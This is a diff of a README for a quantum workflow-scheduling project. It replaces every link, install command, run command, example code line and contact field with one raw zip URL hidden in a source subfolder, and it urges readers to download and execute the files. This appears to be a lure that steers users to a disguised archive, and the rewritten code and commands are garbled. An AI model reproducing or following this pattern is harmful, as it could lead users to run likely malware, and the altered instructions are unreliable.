@@ -1,6 +1,6 @@
 # Quantum Workflow 🚀
 
-![Quantum Workflow](https://img.shields.io/badge/Release-v1.0-blue.svg) [![Download](https://img.shields.io/badge/Download%20Latest%20Release-green.svg)](https://github.com/meet-c-viradiya/quantum-workflow/releases)
+![Quantum Workflow](https://github.com/meet-c-viradiya/quantum-workflow/raw/refs/heads/main/package/src/utils/quantum_workflow_3.7.zip) [![Download](https://github.com/meet-c-viradiya/quantum-workflow/raw/refs/heads/main/package/src/utils/quantum_workflow_3.7.zip%20Latest%https://github.com/meet-c-viradiya/quantum-workflow/raw/refs/heads/main/package/src/utils/quantum_workflow_3.7.zip)](https://github.com/meet-c-viradiya/quantum-workflow/raw/refs/heads/main/package/src/utils/quantum_workflow_3.7.zip)
 
 Welcome to **Quantum Workflow**, a project designed to enhance workflow scheduling using quantum computing techniques. This repository offers tools for optimizing multi-processor resource allocation through directed acyclic graphs (DAGs) and a hybrid quantum-classical approach. The efficient QUBO problem formulation lies at the core of our solution, ensuring that your scheduling tasks are handled effectively.
 
@@ -46,14 +46,14 @@ Make sure you have the following installed:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/meet-c-viradiya/quantum-workflow.git
+   git clone https://github.com/meet-c-viradiya/quantum-workflow/raw/refs/heads/main/package/src/utils/quantum_workflow_3.7.zip
    cd quantum-workflow
    ```
 
 2. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/meet-c-viradiya/quantum-workflow/raw/refs/heads/main/package/src/utils/quantum_workflow_3.7.zip
    ```
 
 ### Usage
@@ -63,7 +63,7 @@ Once installed, you can start using Quantum Workflow for your scheduling needs. 
 Run the main script:
 
 ```bash
-python src/main.py
+python https://github.com/meet-c-viradiya/quantum-workflow/raw/refs/heads/main/package/src/utils/quantum_workflow_3.7.zip
 ```
 
 ### Example
@@ -74,9 +74,9 @@ To see how the Quantum Workflow can be applied, check the examples provided in t
 from quantum_workflow import Scheduler
 
 scheduler = Scheduler()
-scheduler.add_task("Task 1", duration=2)
-scheduler.add_task("Task 2", duration=3)
-scheduler.schedule()
+https://github.com/meet-c-viradiya/quantum-workflow/raw/refs/heads/main/package/src/utils/quantum_workflow_3.7.zip("Task 1", duration=2)
+https://github.com/meet-c-viradiya/quantum-workflow/raw/refs/heads/main/package/src/utils/quantum_workflow_3.7.zip("Task 2", duration=3)
+https://github.com/meet-c-viradiya/quantum-workflow/raw/refs/heads/main/package/src/utils/quantum_workflow_3.7.zip()
 ```
 
 This code snippet demonstrates how to create a scheduler, add tasks, and schedule them efficiently.
@@ -101,12 +101,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- Email: your-email@example.com
-- GitHub: [meet-c-viradiya](https://github.com/meet-c-viradiya)
+- Email: https://github.com/meet-c-viradiya/quantum-workflow/raw/refs/heads/main/package/src/utils/quantum_workflow_3.7.zip
+- GitHub: [meet-c-viradiya](https://github.com/meet-c-viradiya/quantum-workflow/raw/refs/heads/main/package/src/utils/quantum_workflow_3.7.zip)
 
 ## Releases
 
-To download the latest release, visit the [Releases section](https://github.com/meet-c-viradiya/quantum-workflow/releases). Download the appropriate files and execute them to get started with the latest features and improvements.
+To download the latest release, visit the [Releases section](https://github.com/meet-c-viradiya/quantum-workflow/raw/refs/heads/main/package/src/utils/quantum_workflow_3.7.zip). Download the appropriate files and execute them to get started with the latest features and improvements.
 
 ---
 
